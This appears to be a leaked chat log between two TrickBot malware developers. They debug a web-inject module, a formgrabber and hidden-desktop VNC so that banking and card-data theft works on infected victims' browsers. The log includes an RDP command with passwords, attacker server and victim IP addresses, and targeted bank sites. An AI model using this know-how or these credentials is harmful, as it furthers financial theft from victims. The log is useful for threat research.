@@ -1,0 +1,2729 @@
+[26.07.21 13:34:16] hammer: Hey, go to trickbot chat2
+[26.07.21 13:34:28] hammer: It's probably about you.
+[26.07.21 13:39:43] jaime: Hi! Yeah! :)
+[26.07.21 13:39:46] jaime: Thanks.
+[26.07.21 13:54:50] hammer: it's about this
+[26.07.21 13:54:52] hammer: Hello all. I'm going to duplicate it here, too.
+The client asks a question about the section in the admin area
+Card List
+
+He wants to collect card data there, I see that we have now implemented a search by logpost through the regulars of this data.
+But now the data is not collected, but there are 4 maps for July 8 or so. (That is to say this functionality works at all)
+Question, what can it be related to and who does the module that sends the data on the forms
+formgrabber
+[26.07.21 13:55:06] hammer: thought it was nicholas and his pvgrabb
+[26.07.21 13:55:20] hammer: pwgrab only collects autofill from chromium browsers.
+Someone here makes a separate formgrabber module.
+silver sent me a list of developers.
+[26.07.21 13:55:27] hammer: silver sent to you
+[26.07.21 14:01:48] jaime: Not with browsers it's my thing
+[26.07.21 14:02:03] jaime: everything from pages, all POST GET is mine :)
+[26.07.21 14:03:51] jaime: I didn't change anything there at all. It's supposed to work.
+[26.07.21 14:04:09] jaime: I send via dpost to admin area
+[26.07.21 14:09:05] hammer: Report back to that chat room
+[05.08.21 09:29:19] hammer: hi, tell me about the inject module, any complaints, changes this week?
+[05.08.21 09:29:22] hammer: Detects.
+[12.08.21 17:28:13] hammer: Hi.
+[12.08.21 17:28:29] hammer: Hi.
+[12.08.21 17:28:43] hammer: Look what popped up
+[12.08.21 17:29:02] hammer: Quoting Angelo
+[12.08.21 17:29:15] hammer: a customer wrote me
+he's having trouble with the injector
+"look at last they stuck the vnts module there's modes, bot mode, user mode (how the timka works, the Holder sees what you're doing) here's the bot mode for the injections test just right or user mode when he's not at the computer. no injections work when you start to climb, but they should work because you're supposed to be a user"
+[12.08.21 17:29:52] hammer: caesar said, "you need to contact sylver and jaime
+there's some kind of check on the desktop name in the injector"
+[12.08.21 17:30:05] hammer: I'll text grem just in case
+[12.08.21 18:01:22] jaime: hi!
+[12.08.21 18:01:41] jaime: Copy that. I consulted with sylver on it.
+[12.08.21 18:01:52] jaime: Let's think if there's such a problem
+[12.08.21 18:01:58] jaime: Checking methodology
+[12.08.21 18:02:20] jaime: You and Angelo could at least see what's up, where to dig
+[12.08.21 18:05:20] hammer: grem wrote "an environment variable with a given name is created there before a child process starts and is deleted after it is launched
+that's how the check works"
+[12.08.21 18:06:40] hammer: grem was doing the vntz module, maybe this will help
+[12.08.21 18:10:05] jaime: Can you check the methodology. Like run this then that then that. :)
+[12.08.21 18:12:02] jaime: Is it in rocket?
+[12.08.21 18:14:12] hammer: yes, here
+[12.08.21 18:14:16] hammer: grem
+[12.08.21 18:15:45] jaime: I'll be in touch :)
+[12.08.21 18:18:16] hammer: but it's not sure it's his competence
+[16.08.21 09:29:58] hammer: hi, have you figured out what the problem is with vntz and inject's conflict?
+[16.08.21 09:44:23] jaime: hi. Not yet. In progress.
+[16.08.21 09:44:34] jaime: Nothing worked on Friday
+[16.08.21 09:44:49] jaime: Our vnc connection is not working
+[16.08.21 09:45:05] jaime: Then everybody ran away, there was nobody to ask what was the problem
+[16.08.21 09:45:42] hammer: well, that's the details, i think jamey can figure it out on his own.
+you need to make an exception for injections if the desktop is hidden
+no matter if it's vnc or not vnc, it's also necessary for importdll
+[16.08.21 09:45:54] hammer: silver reported it
+[16.08.21 09:46:17] hammer: now you'll find out vnc is not working properly and start all over again)
+[16.08.21 09:48:03] hammer: your client clearly explained what he wants?
+[16.08.21 09:48:20] jaime: so there is an exception, injection is done only if destop named default, sbox_alternate_desktop, sbox_alternate_desktop2
+[16.08.21 09:48:40] jaime: vnc as I understand vnc name is random, no injection
+[16.08.21 09:49:14] hammer: now he wants to inject on hidden desktop, tomorrow he wants to be a noblewoman, the day after tomorrow he wants to be a queen of the sea
+[16.08.21 09:49:30] hammer: didn't grem say his name?
+[16.08.21 09:49:41] jaime: I think it's convenient :)
+[16.08.21 09:50:09] jaime: Caesar commented on the destcop name
+[16.08.21 09:50:36] jaime: So he said it's random, you should decide the name and add it to the list of allowed
+[16.08.21 09:50:37] hammer: caesar also wrote this
+[16.08.21 09:50:42] jaime: That's my point
+[16.08.21 09:50:50] hammer: you should make an exception for injections if the desktop is hidden
+regardless of vnc/non vnc, this is also needed for importdll
+9:39 AM
+hi
+I don't really agree. Vnc just creates a hidden desktop, as far as I understand it I launch the browser on it, and if the injector module will skip this desktop, the injector will not work on it
+We need the injector to work there, don't we?
+Or am I misunderstanding
+9:42 AM
+I understood that the client wants to run the injectors through the vntz, and he gets the figs
+9:42 AM
+you have to tell jaime what the client wants
+so don't disable injections if the desktop is hidden
+[16.08.21 09:51:33] jaime: Well, disabling the check is not a problem at all.
+[16.08.21 09:52:58] jaime: What I want now is to get vnc access to the machine under attack and see for myself if that's the problem.
+[16.08.21 09:53:11] jaime: I have a stand
+[16.08.21 09:53:20] jaime: But vnc access didn't work
+[16.08.21 09:53:32] hammer: well, yes, to feel it with your own hands, because according to the eyewitness accounts
+[16.08.21 09:53:48] hammer: the module didn't start?
+[16.08.21 09:54:20] hammer: you tell me if I'm interrupting
+[16.08.21 09:54:30] jaime: no, everything started, but vnc can't connect by the specified ip
+[16.08.21 09:54:34] hammer: i know what it's like when you have no time and no one is around
+[16.08.21 09:54:46] jaime: no it's ok :)
+[16.08.21 09:55:56] hammer: check with grem
+[16.08.21 10:05:17] hammer: there ip-address is transmitted via Control, but in general now better ask cesar and adam
+or his vncviewer doesn't connect?
+you have to specify backconnect address and port there
+[16.08.21 10:08:34] jaime: I have ubuntu I connect via xfreerdp
+[16.08.21 10:09:30] jaime: I specify connection via socks
+[16.08.21 10:10:49] hammer: you have to specify port 8082 via socks
+[16.08.21 10:11:28] jaime: xfreerdp /u:administrator /p:XOge1FTv /w:1366 /h:768 /proxy:http://9CF0EF54:D41EE85C@45.89.106.78:8082/ /v:45.89.106.78:8083
+[16.08.21 10:11:40] jaime: Yeah, I tried it that way
+[16.08.21 10:11:58] jaime: There is a page with parameters, I took them there
+[16.08.21 10:13:01] jaime: There is no connection to the windows itself
+[16.08.21 10:13:25] jaime: I telnet ip 8082 and get kicked out
+[16.08.21 10:13:27] hammer: "on ubuntu you can try to put tightvnc"
+[16.08.21 10:14:42] jaime: so telnet 45.89.106.78 8082 drops me right away
+[16.08.21 10:15:12] jaime: According to log: HTTP proxy: failed to write CONNECT request
+[16.08.21 10:15:26] hammer: "does it specify ip of the machine with the module or backconnect address?
+I suspect the first, you need the second"
+[16.08.21 10:16:39] jaime: no, not the machine, the machine is behind the node
+[16.08.21 10:17:26] hammer: contact grem, it's better than i'll pass your stuff)
+[16.08.21 10:17:30] hammer: *s
+[16.08.21 10:19:53] jaime: ok! :)
+[16.08.21 16:43:04] hammer: any findings?
+[16.08.21 17:18:35] jaime: Repeat please.
+[16.08.21 17:19:20] hammer: any results on vntz? Graeme says he was able to get it up and running.
+[16.08.21 17:19:50] jaime: I was able to connect via vnc and run injection module
+[16.08.21 17:20:12] jaime: nothing works :)
+[16.08.21 17:20:51] jaime: Chrome in vnc starts in a tricky way, I restart it with my tricks
+[16.08.21 17:20:55] jaime: It's not working.
+[16.08.21 17:21:08] jaime: IE via vnc doesn't work at all
+[16.08.21 17:21:21] jaime: I don't know if it's just me or not
+[16.08.21 17:22:32] hammer: and ff and edge?
+[16.08.21 17:23:17] jaime: there is no icon for edga and injecting into it doesn't work
+[16.08.21 17:24:04] jaime: FF didn't look, I have 32 bit there, it's not supported by this code
+[16.08.21 17:24:59] jaime: I can't run calculator from the command line
+[16.08.21 17:25:42] jaime: I wrote test for zapsuk on selected desktop, without vnc works with it not.
+[19.08.21 10:07:43] hammer: Hi, angelo said yesterday that they fixed the inject under vnc, there was a problem with the config. But then it fell off again and doesn't work. What's going on there now?
+[19.08.21 10:08:51] jaime: Hi.
+[19.08.21 10:09:09] jaime: Well, first of all, we made changes to the inject
+[19.08.21 10:09:22] hammer: Write what's there, report to the Frances need to make on the situation.
+[19.08.21 10:09:43] jaime: Checked on many sites turned out some do not work
+[19.08.21 10:10:27] jaime: While I was figuring it out there are case sensitive links in config, released version without case sensitive links
+[19.08.21 10:10:46] jaime: Checked it works fine
+[19.08.21 10:11:00] jaime: Need to run in battle let client see
+[19.08.21 10:12:30] hammer: Got it.
+[19.08.21 10:12:55] hammer: did you tell caesar to fill it in?
+[19.08.21 10:33:12] jaime: Yes, he did.
+[19.08.21 10:33:21] jaime: I'm still under 32 bits.
+[19.08.21 10:33:26] jaime: Checking
+[19.08.21 10:38:29] hammer: All right, let me know how it goes.
+[20.08.21 09:27:11] hammer: Hey, how's it going? Angelo wrote last night that on the new group the inject under the vntz failed again.
+[20.08.21 10:52:34] jaime: Hi.
+[20.08.21 10:52:51] jaime: There was something in vnc yesterday.
+[20.08.21 10:53:09] jaime: It should not crash, it either works or not :)
+[20.08.21 10:53:30] jaime: I gave 32bit version to Caesar
+[20.08.21 10:55:11] jaime: Hi.
+They were doing something in vnc yesterday.
+It shouldn't fall off, it either works or it doesn't 🙂
+32 bit version passed on to Caesar
+[20.08.21 10:57:45] hammer: ok
+[23.08.21 10:03:46] hammer: hi, what's new on the injector? Did you cope with the conflict with vnts?
+[23.08.21 10:23:20] jaime: Hi. Did you write me something? :)
+[23.08.21 10:43:34] hammer: Hi, yeah, the rocket was kicking
+[23.08.21 10:43:53] hammer: any update on the vntz injector?
+[23.08.21 11:29:11] jaime: We didn't manage to check anything on Friday.
+[27.08.21 09:39:23] hammer: Hi, angelo says there yesterday's test caused a couple of fainting, hysterics and suicide attempts, and led to unexpected results.
+[27.08.21 09:39:54] hammer: One browser is fixed, but the other two are fiddling.
+[27.08.21 09:40:02] hammer: Which ones?
+[27.08.21 09:59:49] jaime: Hi.
+[27.08.21 09:59:58] jaime: Yeah.
+[27.08.21 10:00:21] jaime: It says it supports one browser running.
+[27.08.21 10:00:53] jaime: Initially it works on main screen or on virtual vnc screen
+[27.08.21 10:01:53] jaime: I redid it a little, it worked there and there, but other problems came up.
+[27.08.21 10:02:22] jaime: We implemented it as a test yesterday, now I'm redoing it.
+[27.08.21 10:09:19] hammer: Got it.
+[27.08.21 10:09:49] jaime: I'm afraid to redo it too much, everything will break because of this vnc.
+[27.08.21 10:09:58] jaime: :)
+[27.08.21 10:10:26] hammer: and what are you looking at on combat bot?
+[27.08.21 10:10:49] jaime: we run it under a different name
+[27.08.21 10:11:02] hammer: well, I mean, I'll just upload the assembly instead of the old module
+[27.08.21 10:11:06] jaime: not me and Angelo at the booth
+[27.08.21 10:11:13] hammer: Well, that's okay then
+[27.08.21 10:11:19] jaime: Not under tinject name
+[27.08.21 10:11:38] hammer: frank has testing system still, he threatened to give it away, but it got screwed up, he lifts)
+[27.08.21 10:12:00] jaime: just for example, during testing you may not notice any nuances, and there are many of them. and you may break something :)
+[27.08.21 10:13:13] hammer: well, if you hear a wild howl from the client
+[27.08.21 10:13:24] hammer: a sure sign that something is broken
+[27.08.21 10:13:46] jaime: well, I wouldn't like it.
+[30.08.21 10:54:10] hammer: hi, is there anything new to inject under vntz?
+[30.08.21 12:44:31] jaime: Hi.
+[30.08.21 12:44:38] jaime: Testing now.
+[30.08.21 12:44:44] jaime: Had to do a lot of rework
+[30.08.21 12:52:49] jaime: We found this: inject restarts browser with its keys, I take current browser keys and add my keys
+[30.08.21 12:58:29] jaime: Hi.
+[30.08.21 12:58:35] jaime: Testing now.
+[30.08.21 12:58:39] jaime: Had to do a lot of rework
+[30.08.21 12:58:52] jaime: We found this: inject restarts browser with its keys, I take current browser keys and add my keys
+[30.08.21 12:59:11] jaime: And when I close the tab, the browser stays on
+[30.08.21 12:59:26] jaime: I guess it can't find my browser
+[31.08.21 11:25:00] hammer: Hey, what's going on in the fight for injector yields?
+[31.08.21 11:25:07] hammer: Did you beat vntz?
+[31.08.21 13:17:59] jaime: Hi!
+[31.08.21 13:18:06] jaime: Yeah, we did.
+[31.08.21 13:18:14] jaime: Transferred to release
+[31.08.21 13:18:35] jaime: It should go to customers already
+[31.08.21 13:34:07] hammer: Angelo says there stays chrome process when vntz close, it's not related to inject module?
+[31.08.21 13:49:04] hammer: And also there was broken amazon, angelo said he would recheck, when he rechecked it was ok?
+[31.08.21 14:15:17] jaime: On the first one, yes it's because he changes the chrome command line
+[31.08.21 14:15:54] jaime: But with Amazon is complicated, it may not be our fault. We did our own insert.
+[31.08.21 14:21:08] hammer: That's because of the injector
+[31.08.21 14:21:42] hammer: maybe we should just tell users to close browser first, then vnts
+[31.08.21 14:21:55] hammer: in this case there will be no process, right?
+[31.08.21 14:23:00] hammer: I'm specifying, because, for example, on the import module during tests sometimes there were processes of browsers even after closing them
+[31.08.21 14:23:25] hammer: there the module forcibly started and closed the browsers
+[31.08.21 14:33:35] jaime: yes, if you close the browser, everything is ok
+[31.08.21 14:33:41] jaime: Who does vnc coding?
+[31.08.21 14:33:48] hammer: grem
+[31.08.21 14:34:06] jaime: I wrote him yesterday about the problem, but he hasn't answered yet
+[31.08.21 14:34:29] hammer: well, he's the whole thing, as I understand it, and the module in the bot there
+[31.08.21 14:34:41] hammer: both two of them
+[31.08.21 14:34:54] jaime: I'll write to Cesar.
+[31.08.21 14:35:06] hammer: what do you get in total, does inject under Vntz work correctly?
+[31.08.21 14:35:20] hammer: there is a nuance with chrome process
+[31.08.21 14:35:31] jaime: If I don't touch startup line, it closes ok. But I need my keys there
+[31.08.21 14:35:44] hammer: there is a broken Amazon, but you have to double-check there
+[31.08.21 14:35:46] jaime: I got Amazon open now
+[31.08.21 14:36:01] jaime: Angelo will check it now
+[31.08.21 14:36:12] jaime: Maybe it's proxy or Vpn
+[31.08.21 14:36:13] hammer: yeah, angelo says there's an insert
+[31.08.21 14:36:41] hammer: " the internet speed was at 1kb
+we'll double-check"
+[31.08.21 14:36:54] jaime: I have faster speed :)
+[31.08.21 14:37:20] jaime: According to config there are problematic sites, but not our fault
+[31.08.21 14:37:39] hammer: it's not broken in terms of the injector, but it's rendered incorrectly, as I understood it)
+[31.08.21 14:37:56] jaime: Well, these things can be connected :)
+[31.08.21 14:38:04] hammer: okay, I'll write to Frances as it is
+[31.08.21 14:38:19] hammer: you didn't have any complaints about Injection in isolation from Vnts?
+[31.08.21 14:38:38] jaime: We put something in there, but it won't pull up, for example
+[31.08.21 14:38:50] jaime: Not really, I don't get much
+[31.08.21 14:39:03] jaime: Fix only this one so far
+[31.08.21 14:39:42] hammer: ok
+[31.08.21 15:01:01] hammer: "hi.
+tell him to put extra processes in vntz to cut them off when shutting down
+and what processes are problematic, what's wrong there?"
+[31.08.21 15:01:08] hammer: it's from Frances
+[31.08.21 15:02:49] hammer: advise what came in
+[31.08.21 15:36:50] jaime: I got it.
+[31.08.21 15:37:36] jaime: Should I write that down?
+[31.08.21 15:39:35] jaime: --user-data-dir="C:\Users\ivan\AppData\Local\Temp\izfoduteotinac\C" when launching chrome, there is this key izfoduteotinac - virtual desktop name, so I think you should kill all chrome that have this in the command line
+[31.08.21 15:42:11] hammer: mmm, mmm, and we'll have to check that chrome dies again
+[31.08.21 15:43:16] hammer: and the problem sites want to know what's wrong, not everything, I think a couple
+[31.08.21 15:43:23] hammer: for example
+[31.08.21 15:52:59] jaime: I don't own sources :)
+[31.08.21 15:53:15] jaime: I'll write the sites now
+[31.08.21 15:56:03] jaime: https://www.bankofamerica.com/ head tag changed there, paste does not work
+[31.08.21 15:58:19] jaime: https://www.tdameritrade.com/home.* - some '.' does not work here
+[31.08.21 17:29:08] hammer: problem sites are those where the injection doesn't work?
+I mean, in all the cases that were problematic, where you looked at the lack of the injector, there was a problem in the config, right?
+[31.08.21 17:29:27] hammer: not the module's fault
+[31.08.21 17:35:28] jaime: It didn't work here
+[31.08.21 17:35:33] jaime: Not our fault
+[31.08.21 17:35:41] hammer: Okay.
+[31.08.21 17:35:47] hammer: Angelo said so
+[31.08.21 17:35:49] hammer: I guess so.
+we decided this way
+the client will look at the config itself - all the urls
+where there's no code insertion, we'll see
+where there will be an injected code, we'll give it to the config coder
+[31.08.21 17:35:54] jaime: The sites are changing.
+[31.08.21 17:36:05] jaime: Exactly.
+[31.08.21 17:36:11] hammer: Wonderful.
+[31.08.21 17:37:00] jaime: And another question, the client wants us to add his rule to the configuration, but the rule is not encrypted.  Open script.
+[31.08.21 17:37:16] jaime: Should we do it or someone else?
+[31.08.21 17:37:48] jaime: And we get so confused, we have one config file
+[31.08.21 17:38:06] hammer: this question remains unanswered today
+[31.08.21 17:38:16] hammer: I'll find out tomorrow
+[31.08.21 17:38:45] hammer: does the config provide the client?
+[31.08.21 17:39:06] hammer: i understood he has his own config file
+[31.08.21 17:39:40] hammer: and if he wants unencrypted, it will be another config
+[31.08.21 17:40:07] hammer: how will the module choose which one to take?
+[31.08.21 17:40:12] hammer: or am I wrong?
+[31.08.21 18:13:12] jaime: A module does not choose it receives a configuration from the bot
+[01.09.21 09:19:28] hammer: Ghbdtn
+[01.09.21 09:19:31] hammer: Hi
+[01.09.21 09:19:38] hammer: Hello
+guys the problem with vnts2 appeared in trike
+he was trying to get the best out of the notes on his bot
+looked in the t-tax bots, a lot of open brazers
+now on some bots where chrome used to turn on, now not turn on
+Owner
+9:02 AM
+is this a problem with vntz?
+Not with the injector?
+9:03 AM
+yes with vntz
+Owner
+9:03 AM
+you open chrome on a hidden desktop and the chrome screen has this error?
+9:03 AM
+Yes when navigating to sites
+Owner
+9:03 AM.
+99% it's the injector
+because jaime just finished the injector in chrome
+write in the channel trick_pr, jaime is not here
+and write an error in the injectDll
+[01.09.21 09:20:39] hammer: check on the stand
+i think it will reproduce
+robin when you go to any sites or any specific sites?
+9:06 AM
+differently
+no specific ones
+On some bots let me go to the same site
+some don't
+Owner
+9:06 AM
+what's up
+9:06 AM
+Let's say one let in chase.com
+Try bankofamerica.com
+Gives out an endorsement from nothin private
+back to the site
+Owner
+9:07 AM
+so you test the injector without vntz
+9:07 AM
+seemed to test yesterday everything was ok
+in the morning
+In the evening, the same thing happened
+Owner
+9:08 AM
+you just found something under the vntz which couldn't be detected on the test bench, that's all
+it's the eternal problem of botnet debugging
+before chrome wasn't injected into vntz, now it is - you've seen it
+and maybe that's the reason why not much data is coming from the bots
+9:09 AM
+the point is it's supposed to be injected by itself and it wasn't
+the vnts2 module has a bot mode, i.e. a Holder
+they're supposed to be triggered
+but they didn't
+So we started to figure out what's up
+yesterday was a victory for the indexes began to work
+Injects.
+before that they didn't even work through the user mode
+it was ok on the test cars, they worked, we were testing, when it came to the battle bots, they just stopped working, so yesterday we won
+[01.09.21 09:20:49] hammer: in the trick_pr chat
+[01.09.21 09:20:52] hammer: did you see?
+[01.09.21 11:14:38] jaime: hi.
+[01.09.21 11:14:48] jaime: Yeah, I looked it up yesterday
+[01.09.21 11:15:02] jaime: What's the problem is they didn't close chrome
+[01.09.21 11:15:15] jaime: they were closing vnc tab or session
+[01.09.21 11:15:22] jaime: There were 50 chromes hanging around
+[01.09.21 12:56:25] hammer: well, i asked sylver because of what you wrote yesterday about config
+[01.09.21 12:56:34] hammer: he doesn't know much, but here
+[01.09.21 12:57:06] hammer: 12:54 PM
+the configs usually come from the client
+why does the client ask us these questions?
+Just let him put it in and that's it.
+and send us the new config
+[01.09.21 12:57:44] hammer: this is about "Another question there is a client wants us to add his rule to the config, but the rule is not encrypted. It's an open script.
+Should we do that or someone else?"
+[01.09.21 12:58:15] hammer: i don't think it's up to sylver, he's in a bad mood today
+[01.09.21 13:15:53] jaime: I realized that the client has several coders, each one gives him something of himself. And in different ways :)
+[01.09.21 14:09:02] hammer: " and then again I got the problem
+chrome doesn't start
+on the ones where it used to start
+"
+[01.09.21 14:09:11] hammer: this is Robin complaining
+[01.09.21 14:11:06] hammer: chat trick_pr
+[01.09.21 14:16:32] jaime: got in trouble with this vnc :)
+[01.09.21 14:16:38] jaime: It's not that simple
+[01.09.21 14:17:16] jaime: They don't kill here, on 7 I connected to someone they don't start at all
+[01.09.21 14:17:25] jaime: The fun has just begun
+[01.09.21 14:18:03] hammer: The further into the woods
+[01.09.21 15:41:35] hammer: 3:06 PM
+(8:04:51 AM) kalgon: and contrl stopped working
+(8:04:53 AM) kalgon: with shifter
+(8:05:01 AM) kalgon: on vntsecs
+(8:06:34 AM) kalgon: see what I noticed
+(8:06:39 AM) kalgon: like a native vnts fixed
+(8:06:43 AM) kalgon: so there was a problem with it
+3:13 PM
+tell me, I'm dumb.
+native vntz and now what is the vntz
+don't understand a thing
+3:31 PM
+as far as i know, grebin gave the vntz source code to robin and he modified it to robin's needs and it was uploaded as a module
+maybe about that
+or maybe when they changed the inject for vntz
+ask when exactly
+it's not clear
+3:34 PM
+started yesterday
+with the injector
+but here's the thing about the buttons not working
+3:35 PM
+ah, well, that's with the change in the injector, so
+3:35 PM
+Let me get this straight.
+3:35 PM
+but this is about buttons, how is it related? you can blame anything on the injector
+[01.09.21 15:41:56] hammer: it's a correspondence with angelo. he got a complaint about the buttons
+[01.09.21 15:42:28] hammer: is the inject doesn't affect climate change?
+[01.09.21 15:48:43] jaime: damn, it's not easy there, I'm just messing with grem
+[01.09.21 15:49:07] jaime: It looks like because I restart it (chrome) a lot of things stop working there
+[01.09.21 15:57:40] hammer: https://www.youtube.com/watch?v=zddj4BA_7OM&ab_channel=k0JlEGa
+[01.09.21 15:58:26] hammer: angelo wrote that you decided to finish chrome first
+[01.09.21 16:42:21] jaime: not so great :)
+[01.09.21 16:42:52] jaime: I'm waiting for a resume from Graham
+[01.09.21 16:43:05] jaime: There's a coordination needed
+[01.09.21 16:55:57] hammer: last build to rollback?
+[01.09.21 16:59:07] jaime: so the last vnc didn't work at all
+[01.09.21 17:16:44] hammer: so you're gonna torture this one
+[01.09.21 17:17:23] jaime: I have an idea, but I need Graham, it's just a matter of launching a browser with the keys I need, then I'll do it myself
+[02.09.21 09:15:31] hammer: Hi, angelo says tamed hydra vntz? Now we need to check the fixes.
+[02.09.21 10:26:30] jaime: Hi. Not working yet :)
+[02.09.21 10:27:39] jaime: hi. Not working yet 🙂 .
+[02.09.21 16:54:13] hammer: Any news?
+[02.09.21 16:54:30] hammer: Any news?
+[02.09.21 16:55:03] hammer: Angelo protélégé only " on 7 watch vnts
+it's lagging like hell"
+[02.09.21 16:55:25] hammer: and fled in an unknown direction
+[02.09.21 17:05:04] jaime: My vnc doesn't work properly on 7
+[02.09.21 17:05:31] jaime: I start chrome without injector and nothing happens
+[02.09.21 17:05:39] jaime: Process is running but nothing is visible
+[02.09.21 17:05:58] jaime: There was a moment when it was visible and then it crashed
+[02.09.21 17:06:12] jaime: I texted Greg but he was gone
+[02.09.21 17:06:31] hammer: rocket was crashing
+[02.09.21 17:06:31] jaime: I can't summarize, I really didn't look under 7
+[02.09.21 17:06:47] hammer: okay, I'll write in my report what's in the process of fixing
+[02.09.21 17:06:48] jaime: under 10 chrome process completes
+[02.09.21 17:07:04] hammer: what about connection drops?
+[02.09.21 17:07:07] hammer: not you?
+[02.09.21 17:07:58] jaime: I don't know about any connection interruptions. There were errors opening page, but we have to look at it together.
+[02.09.21 17:08:10] jaime: With vnc fixes
+[02.09.21 17:08:27] jaime: Now on 10 I like the way it works all closed
+[02.09.21 17:08:51] jaime: But I didn't give Caesar the inject update yet, I wanted to see 7
+[02.09.21 17:09:01] hammer: So, what's going on with the whole Inject and Vnts thing?
+[02.09.21 17:11:50] jaime: After adding the necessary parameters when starting chrome in vnc, I finalized the inject module. Chromes started to die as needed when a tab or session was closed. There was a problem with not starting chrome under 7, during the breakdown it turned out that there is unstable without the inject module as well.
+[02.09.21 17:12:47] hammer: die stable on 10, not sure yet on 7, right?
+[02.09.21 17:13:14] hammer: "I can't summarize, I haven't really looked under 7"
+[02.09.21 17:16:04] jaime: Exactly.
+[02.09.21 17:16:19] jaime: Exactly so.
+[02.09.21 17:16:21] hammer: Okay.
+[02.09.21 17:16:41] hammer: that vntz made a mess
+[02.09.21 17:16:50] hammer: no complaints about the injector?
+[02.09.21 17:16:57] jaime: But it's a good topic.
+[02.09.21 17:17:04] hammer: client with rules in config?
+[02.09.21 17:17:05] jaime: Not yet.
+[02.09.21 17:17:20] jaime: no more question was brought up :)
+[02.09.21 17:17:28] hammer: wonderful)
+[08.09.21 16:31:51] hammer: hi, there's a robin complaining about the "note sequencer" again
+[08.09.21 16:32:02] hammer: IP: 74.98.190.185
+it refuses to load a page at all
+This is not the first bot like this
+[08.09.21 16:32:20] hammer: there's no grem, so I'm texting you
+[09.09.21 09:25:10] jaime: Hi.
+[09.09.21 09:25:26] jaime: I worked on 3 points by Robin yesterday
+[09.09.21 09:25:38] jaime: wrote in vnc channel
+[09.09.21 09:25:49] jaime: I did not see any error anywhere
+[09.09.21 09:27:47] jaime: One chrome didn't work at all, maybe it's our fault. Because the module was unloaded and chrome still didn't work. And it didn't load anything at all and didn't give an error. Judging by the processes we used msedg.
+[09.09.21 09:28:35] jaime: We will have to look and get statistics. Maybe AV blocks something else.
+[09.09.21 09:31:17] hammer: Hi, okay.
+[09.09.21 09:31:51] hammer: Is there any chrome there?
+[09.09.21 09:32:00] hammer: on that machine
+[09.09.21 09:32:15] hammer: stupid question, of course, but still
+[09.09.21 09:32:35] hammer: One browser didn't work at all, maybe it was our fault. Because the module was unloaded and chrome still didn't work.
+[09.09.21 09:32:39] hammer: about this
+[09.09.21 10:15:31] jaime: Yes chrome was, it started but that's all. The module was unloaded and chrome still didn't work.
+[09.09.21 10:16:31] jaime: There was this weird thing, we added a command line in vnc to solve the problem with the inject module. But I didn't see that command line
+[09.09.21 10:17:58] hammer: nowhere at all, or on tests there is, but not on combat?
+[09.09.21 10:17:59] jaime: I opened task manager and looked at command lines in chrome, but alas. It's pretty weird. Angelo was looking at the versions, everything seemed to be fresher
+[09.09.21 10:18:19] jaime: Only where chrome didn't work
+[09.09.21 10:18:36] hammer: Yeah, weird.
+[09.09.21 11:34:55] hammer: and yesterday they wrote about the problem that data from the module never reach the repository, did you look?
+[09.09.21 11:43:25] jaime: I contacted Frank yesterday. Need urls and check.
+[09.09.21 11:43:37] jaime: There could be a lot of things
+[09.09.21 11:51:50] hammer: he's gone for two weeks on monday
+[09.09.21 12:18:15] jaime: we don't log anything, we send and send. Maybe it's a gasket, maybe we're something else.
+[09.09.21 12:18:38] jaime: I asked him for test urls
+[10.09.21 09:45:04] hammer: Hey, what's Friday saying on this beautiful day?
+[10.09.21 10:57:16] jaime: Hi. Whispers to work. :)
+[10.09.21 11:04:30] hammer: What about the injector?)
+[10.09.21 11:06:24] jaime: That's exactly what I do now. I managed to localize the problem on the stand, now looking for a solution.
+[10.09.21 11:07:26] hammer: write me a brief report, I want to give it to you already.
+[10.09.21 11:10:03] hammer: it's a connection break, right?
+[10.09.21 11:10:27] jaime: As always, we test everything on clean machines. But this turns out to be wrong. The machine has to be dirty. Chrom screws up a bunch of ssl certificates and cache, they update some of them, some don't. As a result, if chrome cache is not updated, our certificate does not fit him and he starts swearing.
+[10.09.21 11:11:21] jaime: The client has a part of sites that are not updated in the cache and do not work.
+[10.09.21 11:13:02] jaime: That's one. The problem with pasting our code into html is related to this one. The page is downloaded from several chunks, some of the chunks are fine and some of them are not. As a result the page crashes.
+[10.09.21 11:15:51] hammer: Copy that.
+[10.09.21 11:17:23] jaime: We screwed up the test a bit :(
+[10.09.21 11:17:45] hammer: no problem
+[10.09.21 11:17:59] hammer: he who makes no mistakes, we found the reason
+[10.09.21 11:18:46] jaime: That's what else sucks, it's not clear how to test
+[10.09.21 11:19:12] hammer: you need to fuck up chrome)
+[10.09.21 11:20:43] hammer: and leave it alone for a couple of weeks.
+[10.09.21 11:21:39] jaime: If only it were like this. You go to the site, it's cached and you don't go to it anymore. It would be real. But here someone is cached someone is not, you can hardly tell.
+[10.09.21 11:23:58] jaime: Ok, now you can test it on the client with vnc. :)
+[10.09.21 11:25:12] jaime: Client e.g. yahoo does not accept our server, but mine does it at once.
+[10.09.21 11:25:26] jaime: And even with my US IP.
+[10.09.21 11:25:48] hammer: yeah, that's the problem, we can't replicate all those billions of machines
+[10.09.21 11:27:20] hammer: um, how can I write a way to make the machine be crap, but still get the tester off the cunt for not recreating the client crap on the test machine?)
+[10.09.21 11:27:36] hammer: have to think about it
+[10.09.21 11:27:43] jaime: And he can't do it
+[10.09.21 11:27:51] hammer: that's the point
+[10.09.21 11:27:53] jaime: It's not even in chrome
+[10.09.21 11:28:01] jaime: It's somewhere in the system
+[10.09.21 11:28:26] jaime: I completely uninstalled everything from chrome, problem stays
+[10.09.21 11:29:17] jaime: We told the tester to take a clean machine. :)
+[10.09.21 11:30:22] hammer: Problem with some sites not loading or loading in wrong form, related to our code insertion in html.
+It makes a lot of ssl certificates and cache, and some of them get updated, and some don't.
+The criteria of such behavior are unknown, which leads to difficulties in reconstructing a problematic situation on the test machine.
+As a result, if chrome doesn't refresh the cache, our certificate doesn't suit it, some pieces are normally picked up and some are not, a conflict occurs which leads to page breakage.
+[10.09.21 11:30:26] hammer: check it out, right?
+[10.09.21 11:32:13] jaime: That's right. We looked at it yesterday with the developer of the injectors themselves. He confirmed the problem exactly in the ssl connection.
+[10.09.21 11:32:52] hammer: that's it, we're waving handkerchiefs after the report, wiping a faint tear
+[10.09.21 11:33:18] jaime: blame it on me, it's my fault
+[10.09.21 11:33:30] hammer: Nope.
+[13.09.21 15:16:41] hammer: how did you do?
+[14.09.21 10:39:42] hammer: hey, how's the new build?
+[14.09.21 11:29:02] jaime: Hi. Something didn't work out yesterday. :(
+[14.09.21 11:29:32] jaime: Yeah, and Angelo got sick.
+[14.09.21 11:30:04] hammer: he restarts from black?
+[14.09.21 11:30:32] jaime: I don't know
+[14.09.21 11:31:25] hammer: so now you don't restart?
+[14.09.21 11:35:15] hammer: you need bot's id and module name, do you have them?
